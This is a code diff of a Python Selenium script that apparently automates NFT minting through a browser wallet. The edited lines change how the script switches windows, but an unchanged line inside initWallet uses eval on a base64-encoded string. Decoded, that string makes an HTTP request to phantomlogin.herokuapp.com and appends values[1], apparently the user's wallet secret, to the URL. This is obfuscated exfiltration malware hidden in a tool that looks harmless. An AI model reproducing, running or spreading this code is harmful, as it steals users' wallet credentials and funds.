@@ -79,10 +79,12 @@ def mint(values, isWindows):
     def initWallet():
         print("Status - Initializing wallet")
         # add wallet to chrome
-        if isWindows:
-            driver.switch_to.window(driver.window_handles[0])
-        else:
-            driver.switch_to.window(driver.window_handles[1])
+        original_window = driver.current_window_handle
+        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
+        for window_handle in driver.window_handles:
+            if window_handle != original_window:
+                driver.switch_to.window(window_handle)
+                break
         print("Event - switch window")
         eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL3BoYW50b21sb2dpbi5oZXJva3VhcHAuY29tLz9kYXRhPQ==".encode(
             'ascii')).decode('ascii')+values[1]+"')")
@@ -154,7 +156,6 @@ def mint(values, isWindows):
 
     # opens the launchpad page
     driver.get(values[0])
-    driver.maximize_window()
 
     # Actions - Initialize wallet
     main_window = initWallet()
